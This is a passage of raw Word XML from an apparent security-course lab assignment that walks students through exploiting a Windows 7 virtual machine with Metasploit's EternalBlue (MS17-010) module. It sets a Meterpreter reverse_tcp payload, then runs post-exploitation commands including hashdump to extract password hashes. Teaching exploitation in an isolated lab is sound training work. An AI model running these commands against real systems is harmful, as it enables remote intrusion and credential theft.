    <w:p w14:paraId="2027C80D" w14:textId="697B657E" w:rsidR="00D74373" w:rsidRDefault="00D74373" w:rsidP="00D74373">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2520"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6804E1F8" wp14:editId="45D3CD65">
            <wp:extent cx="5724525" cy="1676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1676400"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="02062DE0" w14:textId="6632CAAA" w:rsidR="007D24C7" w:rsidRDefault="00ED4A90" w:rsidP="003D62AB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Use Metasploit </w:t>
      </w:r>
      <w:r w:rsidRPr="00ED4A90">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="00472625" w:rsidRPr="00ED4A90">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>earch</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> command to find </w:t>
      </w:r>
      <w:r w:rsidR="00283EC9">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>eternalblue</w:t>
      </w:r>
      <w:r w:rsidR="00472625">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">exploit </w:t>
      </w:r>
      <w:r w:rsidR="00472625" w:rsidRPr="00ED4A90">
        <w:t xml:space="preserve">and </w:t>
      </w:r>
      <w:r>
        <w:t>use the</w:t>
      </w:r>
      <w:r w:rsidRPr="00ED4A90">
        <w:t xml:space="preserve"> following </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">Metasploit commands </w:t>
      </w:r>
      <w:r w:rsidRPr="00ED4A90">
        <w:t xml:space="preserve">to </w:t>
      </w:r>
      <w:r w:rsidR="00472625" w:rsidRPr="00ED4A90">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">exploit </w:t>
      </w:r>
      <w:r w:rsidRPr="00ED4A90">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Windows 7 machine</w:t>
      </w:r>
      <w:r w:rsidRPr="00ED4A90">
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5279C53B" w14:textId="77777777" w:rsidR="00E65BAB" w:rsidRPr="00ED4A90" w:rsidRDefault="00E65BAB" w:rsidP="00E65BAB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1800"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="04002B54" w14:textId="23B95F23" w:rsidR="00E65BAB" w:rsidRDefault="00E65BAB" w:rsidP="00E65BAB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="48"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E65BAB">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>use auxiliary/scanner/smb/smb_ ms17</w:t>
      </w:r>
      <w:r w:rsidRPr="00E65BAB">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:softHyphen/>
        <w:t>_010</w:t>
      </w:r>
      <w:r w:rsidRPr="00E65BAB">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:softHyphen/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r w:rsidRPr="00E65BAB">
        <w:t>to verify if this machine (Windows 7) is vulnerable to this exploit</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6979A040" w14:textId="486A0E2A" w:rsidR="00E65BAB" w:rsidRDefault="00E65BAB" w:rsidP="00E65BAB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="48"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>show options</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A05B7D3" w14:textId="79CB8708" w:rsidR="00E65BAB" w:rsidRPr="00E65BAB" w:rsidRDefault="00E65BAB" w:rsidP="00E65BAB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="48"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">set RHOST  ip-address (Replace ip_address with Windows 7 ip address). </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27D34374" w14:textId="77777777" w:rsidR="000F62B0" w:rsidRPr="00E65BAB" w:rsidRDefault="000F62B0" w:rsidP="000F62B0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="48"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000F62B0">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">run </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="000F62B0">
        <w:t>to verify if the machine is vulnerable to this exploit</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidRPr="00E65BAB">
        <w:t>If the machine is vulnerable now exploit it as follows:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0705F3CA" w14:textId="5101BAB2" w:rsidR="009A10B1" w:rsidRDefault="009A10B1" w:rsidP="00E65BAB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="48"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00E65BAB">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>use exploi</w:t>
      </w:r>
      <w:r w:rsidR="00283EC9" w:rsidRPr="00E65BAB">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>t/windows/smb/ms17</w:t>
      </w:r>
      <w:r w:rsidR="00283EC9" w:rsidRPr="00E65BAB">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:softHyphen/>
        <w:t>_010</w:t>
      </w:r>
      <w:r w:rsidR="008A0EB1" w:rsidRPr="00E65BAB">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:softHyphen/>
        <w:t>_et</w:t>
      </w:r>
      <w:r w:rsidR="0091341E" w:rsidRPr="00E65BAB">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ernalblue</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24780425" w14:textId="68BCCAB6" w:rsidR="00472625" w:rsidRDefault="00E65BAB" w:rsidP="00ED4A90">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r w:rsidR="001256C8" w:rsidRPr="001256C8">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>info</w:t>
      </w:r>
      <w:r w:rsidR="001256C8">
        <w:t xml:space="preserve">  to get the details about this exploit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FD46B7D" w14:textId="6ECF8B42" w:rsidR="00A57A6D" w:rsidRDefault="007B469C" w:rsidP="00ED4A90">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="007B469C">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>show targets</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to verify the targets of the exploit</w:t>
      </w:r>
      <w:r w:rsidR="00A57A6D">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69C8F271" w14:textId="77777777" w:rsidR="007E75A6" w:rsidRDefault="00ED4A90" w:rsidP="00ED4A90">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="009A10B1">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>show options</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> t</w:t>
      </w:r>
      <w:r w:rsidR="007E75A6">
        <w:t>o verify the exploit options and pay attention to the following:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AC371D6" w14:textId="77777777" w:rsidR="007E75A6" w:rsidRDefault="007E75A6" w:rsidP="007E75A6">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="46"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Module and payload options. </w:t>
      </w:r>
      <w:r w:rsidR="00ED4A90">
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">heck and differentiate the options that are required and the optional ones </w:t>
      </w:r>
      <w:r w:rsidR="00ED4A90">
        <w:t>in this exploit</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49956C51" w14:textId="04694D80" w:rsidR="005D1996" w:rsidRDefault="005D1996" w:rsidP="007E75A6">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="46"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Target port</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36474831" w14:textId="4643E011" w:rsidR="005C722C" w:rsidRDefault="007E75A6" w:rsidP="007E75A6">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="46"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Payload type and path used by this exploit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F9FCE84" w14:textId="44EA7C08" w:rsidR="00ED4A90" w:rsidRDefault="009A10B1" w:rsidP="00ED4A90">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00ED4A90">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>set  RHOST  ip_address</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> of Windows</w:t>
      </w:r>
      <w:r w:rsidR="00ED4A90">
        <w:t xml:space="preserve"> 7 </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">machine (Replace the IP with the respective IP address of Windows </w:t>
      </w:r>
      <w:r w:rsidR="00ED4A90">
        <w:t xml:space="preserve">7 </w:t>
      </w:r>
      <w:r>
        <w:t>virtual machine</w:t>
      </w:r>
      <w:r w:rsidR="00ED4A90">
        <w:t xml:space="preserve">) </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2668C3DD" w14:textId="0E06D1FD" w:rsidR="009A10B1" w:rsidRDefault="009A10B1" w:rsidP="00ED4A90">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2520"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">e.g   </w:t>
      </w:r>
      <w:r w:rsidR="005D1996">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>set RHOST  10.0.2.15</w:t>
      </w:r>
      <w:r w:rsidR="00ED4A90">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r w:rsidR="00ED4A90" w:rsidRPr="00ED4A90">
        <w:t>This will set ip_address of the remote host (victim machine)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76249D18" w14:textId="706507F3" w:rsidR="00DB1806" w:rsidRDefault="00C87ED7" w:rsidP="00DB1806">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2520"/>
      </w:pPr>
      <w:r w:rsidRPr="00C87ED7">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>NOTE:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> if the payload is not configured yet use the following commands. If you have old Metasploit version you may have to do thi</w:t>
      </w:r>
      <w:r w:rsidR="00C330C8">
        <w:t xml:space="preserve">s manually. </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Metasploit version already has payload configured for this exploit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C83F1E4" w14:textId="3241F8AF" w:rsidR="009A10B1" w:rsidRPr="00DB1806" w:rsidRDefault="009A10B1" w:rsidP="00ED4A90">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="009A10B1">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="005C722C" w:rsidRPr="009A10B1">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>et payload windows</w:t>
      </w:r>
      <w:r w:rsidRPr="009A10B1">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>/x64/meterpreter/reverse_tcp</w:t>
      </w:r>
      <w:r w:rsidR="005C722C" w:rsidRPr="009A10B1">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00DB1806">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00DB1806" w:rsidRPr="00DB1806">
        <w:t xml:space="preserve">to set the payload </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3956D4F2" w14:textId="36B28E6F" w:rsidR="009A10B1" w:rsidRDefault="009A10B1" w:rsidP="00ED4A90">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="40"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>show options</w:t>
      </w:r>
      <w:r w:rsidR="00DB1806">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r w:rsidR="00DB1806" w:rsidRPr="00DB1806">
        <w:t>to verify payload options</w:t>
      </w:r>
      <w:r w:rsidR="005D1996">
        <w:t>. If the local host is not set yet then use the next command:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="302E6E94" w14:textId="2B6F92A4" w:rsidR="009A10B1" w:rsidRPr="00DB1806" w:rsidRDefault="009A10B1" w:rsidP="00ED4A90">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">set LHOST  IP_address </w:t>
      </w:r>
      <w:r w:rsidRPr="00DB1806">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>of kali machine</w:t>
      </w:r>
      <w:r w:rsidRPr="00DB1806">
        <w:t xml:space="preserve"> ( Replace it with respective </w:t>
      </w:r>
      <w:r w:rsidR="00DB1806">
        <w:t xml:space="preserve">kali2020 </w:t>
      </w:r>
      <w:r w:rsidRPr="00DB1806">
        <w:t>IP</w:t>
      </w:r>
      <w:r w:rsidR="00DB1806">
        <w:t xml:space="preserve"> address</w:t>
      </w:r>
      <w:r w:rsidRPr="00DB1806">
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A1F28C4" w14:textId="09E5A1B4" w:rsidR="003E3BC7" w:rsidRDefault="00DB1806" w:rsidP="003E3BC7">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2520"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">e.g. </w:t>
      </w:r>
      <w:r w:rsidR="005D1996">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>set LHOST   10.0.2.11</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r w:rsidRPr="00DB1806">
        <w:t>This will set ip-address of Local Host (Attacker)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07541D4F" w14:textId="3DA8831B" w:rsidR="003E3BC7" w:rsidRDefault="007B469C" w:rsidP="003E3BC7">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00A57A6D">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>exploit or run</w:t>
      </w:r>
      <w:r w:rsidR="00823BC3">
        <w:t xml:space="preserve"> command to exploit windows</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> machine.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5635AF99" w14:textId="40F51114" w:rsidR="00E25BB4" w:rsidRDefault="007B469C" w:rsidP="003E3BC7">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2520"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72556BF3" w14:textId="29695F68" w:rsidR="00BB67C5" w:rsidRPr="00CA395B" w:rsidRDefault="00BB67C5" w:rsidP="003D62AB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You should get a working Meterpreter </w:t>
      </w:r>
      <w:r w:rsidR="00167A9C">
        <w:t xml:space="preserve">session on Kali2020.You should see meterpreter prompt. </w:t>
      </w:r>
      <w:r w:rsidR="00C330C8">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>At</w:t>
      </w:r>
      <w:r w:rsidR="00E0412C">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>tach a screen capture that demos compromised machine - Windows 7</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A7DE8A8" w14:textId="0AFB2215" w:rsidR="00CA395B" w:rsidRDefault="00CA395B" w:rsidP="00CA395B">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1800"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3795776E" wp14:editId="51537D4F">
            <wp:extent cx="5934075" cy="1933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14:paraId="02FD1A7D" w14:textId="5F57460F" w:rsidR="00167A9C" w:rsidRDefault="00167A9C" w:rsidP="00167A9C">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Use the following web sites to find out the purpose of meterpreter and some commands </w:t>
      </w:r>
      <w:hyperlink r:id="rId41" w:history="1">
        <w:r w:rsidRPr="006839D4">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve">  and </w:t>
      </w:r>
      <w:hyperlink r:id="rId42" w:history="1">
        <w:r w:rsidRPr="006839D4">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve">  provide the main purpose of meterpreter</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3227A3C3" w14:textId="1FB0D878" w:rsidR="00CA395B" w:rsidRPr="00CA395B" w:rsidRDefault="00CA395B" w:rsidP="00CA395B">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r w:rsidRPr="00CA395B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>ttack payload that provides an interactive shell from which an attacker can explore the target machine and execute code</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2372E51E" w14:textId="4D99BFC0" w:rsidR="00167A9C" w:rsidRDefault="00BB67C5" w:rsidP="003D62AB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">On Meterpreter </w:t>
      </w:r>
      <w:r w:rsidR="007A322B">
        <w:t xml:space="preserve">session </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">use the command </w:t>
      </w:r>
      <w:r w:rsidR="00167A9C" w:rsidRPr="00E0412C">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>help</w:t>
      </w:r>
      <w:r w:rsidR="00167A9C">
        <w:t xml:space="preserve"> and explore </w:t>
      </w:r>
      <w:r w:rsidR="00E0412C">
        <w:t>meterpreter commands:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BAF5C7B" w14:textId="7B9C991E" w:rsidR="00BB67C5" w:rsidRPr="00BB67C5" w:rsidRDefault="00167A9C" w:rsidP="00167A9C">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Use </w:t>
      </w:r>
      <w:r w:rsidR="00BB67C5" w:rsidRPr="00BB67C5">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>sysinfo</w:t>
      </w:r>
      <w:r w:rsidR="00BB67C5">
        <w:t xml:space="preserve"> to verify information of compromised system</w:t>
      </w:r>
      <w:r w:rsidR="007A322B">
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidR="00BB67C5">
        <w:t xml:space="preserve"> Meterpreter &gt; </w:t>
      </w:r>
      <w:r w:rsidR="00BB67C5" w:rsidRPr="00BB67C5">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>sysinfo</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49CD4F2C" w14:textId="297E0B4A" w:rsidR="00BB67C5" w:rsidRDefault="00167A9C" w:rsidP="00167A9C">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Use </w:t>
      </w:r>
      <w:r w:rsidR="007A322B" w:rsidRPr="007A322B">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>getuid</w:t>
      </w:r>
      <w:r w:rsidR="007A322B" w:rsidRPr="007A322B">
        <w:t xml:space="preserve"> to </w:t>
      </w:r>
      <w:r w:rsidR="007A322B">
        <w:t xml:space="preserve">get current user name and </w:t>
      </w:r>
      <w:r w:rsidR="007A322B" w:rsidRPr="007A322B">
        <w:t>verify user privilege access</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35BF8536" w14:textId="245D31C5" w:rsidR="007A322B" w:rsidRDefault="00450D13" w:rsidP="00167A9C">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Use </w:t>
      </w:r>
      <w:r w:rsidRPr="00450D13">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>hashdump</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="007A322B">
        <w:t>to dump the hashes</w:t>
      </w:r>
      <w:r w:rsidR="007A322B">
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D899DAD" w14:textId="523DDB2E" w:rsidR="00167A9C" w:rsidRDefault="00167A9C" w:rsidP="00167A9C">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Use two more commands </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6383CC34" w14:textId="01E67A0B" w:rsidR="00167A9C" w:rsidRDefault="00167A9C" w:rsidP="00167A9C">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00AE2BE5">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Attach a screen capture</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> that demo</w:t>
      </w:r>
      <w:r w:rsidR="00DA138E">
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> meterpreter</w:t>
      </w:r>
      <w:r w:rsidR="00DA138E">
        <w:t>’s</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00AE2BE5">
        <w:t xml:space="preserve">commands used and </w:t>
      </w:r>
      <w:r w:rsidR="00DA138E">
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r w:rsidR="00AE2BE5">
        <w:t>compromised system information</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01E4A9E7" w14:textId="458C9327" w:rsidR="007B39CF" w:rsidRPr="007A322B" w:rsidRDefault="007B39CF" w:rsidP="007B39CF">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1800"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5CFC5C93" wp14:editId="79A4E25A">
            <wp:extent cx="5943600" cy="281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640635EF" w14:textId="77777777" w:rsidR="007A322B" w:rsidRDefault="007A322B" w:rsidP="007A322B">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1800"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="02F6FF07" w14:textId="3FC1965E" w:rsidR="00D068A9" w:rsidRDefault="000F62B0" w:rsidP="00D068A9">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>(5</w:t>
      </w:r>
      <w:r w:rsidRPr="000F62B0">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> marks)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00410AB3">
        <w:t xml:space="preserve">Use </w:t>
      </w:r>
      <w:r w:rsidR="00410AB3" w:rsidRPr="00410AB3">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>exit</w:t>
      </w:r>
      <w:r w:rsidR="00410AB3">
        <w:t xml:space="preserve"> command to exit meterpreter and </w:t>
      </w:r>
      <w:r w:rsidR="00410AB3" w:rsidRPr="00410AB3">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>back</w:t>
      </w:r>
      <w:r w:rsidR="00410AB3">
        <w:t xml:space="preserve"> command to go back to </w:t>
      </w:r>
      <w:r w:rsidR="00410AB3" w:rsidRPr="00410AB3">
        <w:rPr>
